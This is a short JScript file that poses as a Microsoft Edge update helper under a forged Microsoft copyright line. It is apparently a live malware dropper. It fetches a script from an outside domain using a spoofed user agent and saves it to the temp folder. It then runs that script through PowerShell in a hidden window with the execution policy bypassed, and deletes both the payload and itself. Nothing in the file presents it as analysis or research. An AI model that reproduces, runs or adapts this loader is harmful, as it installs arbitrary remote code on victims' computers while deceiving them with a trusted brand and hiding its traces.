// Microsoft Edge Update Helper
// Version: 1.2.4
// (c) Microsoft Corporation. All rights reserved.

var shell = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var tempDir = shell.ExpandEnvironmentStrings("%temp%");
var scriptPath = tempDir + "\\EdgeUpdate.ps1";

// Download update manifest
http.open("GET", "https://bilbaolake.com/s", false);
http.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)");
http.send();

if (http.status == 200) {
    var file = fso.CreateTextFile(scriptPath, true);
    file.Write(http.responseText);
    file.Close();

    // Apply update
    shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " + scriptPath, 0, true);

    // Cleanup
    try { fso.DeleteFile(scriptPath); } catch(e) {}
}

// Remove self
try { fso.DeleteFile(WScript.ScriptFullName); } catch(e) {}
